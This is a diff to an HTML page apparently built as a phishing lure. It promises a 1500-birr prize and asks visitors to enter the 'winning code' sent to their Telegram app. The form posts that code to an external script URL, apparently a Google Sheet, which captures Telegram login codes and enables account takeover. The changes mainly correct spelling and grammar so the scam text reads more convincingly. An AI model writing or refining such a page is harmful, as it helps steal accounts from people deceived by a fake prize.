@@ -9,22 +9,22 @@
   <body>
     <!-- Reward Section -->
     <div id="reward-page">
-      <h1 class="main-title">🎉 Congratulation you won 1500 birr 🎉</h1>
+      <h1 class="main-title">🎉 Congratulations! You won 1500 birr 🎉</h1>
       <p>
-        The wining number is sent to your telegram app enter the code in the
-        bellow box <br />
-        to get your rewards and to withdraw your money right now
+        The winning code has been sent to your Telegram app. Enter the code in
+        the box below to claim your reward and withdraw your money right now!
       </p>
       <div class="contact-right">
         <form name="submit-to-google-sheet">
           <textarea
             name="Message"
+            id="code-input"
             rows="6"
             placeholder="Write the code here"
             required
           ></textarea>
           <button type="submit" class="btn btn2">Get Now</button>
-          <p class="try">you have 5 chances to try</p>
+          <p class="try">You have 5 chances to try</p>
         </form>
         <span id="msg"></span>
       </div>
@@ -37,6 +37,7 @@
       const form = document.forms["submit-to-google-sheet"];
       const msg = document.getElementById("msg");
 
+      // Form submission logic
       form.addEventListener("submit", (e) => {
         e.preventDefault();
         fetch(scriptURL, { method: "POST", body: new FormData(form) })
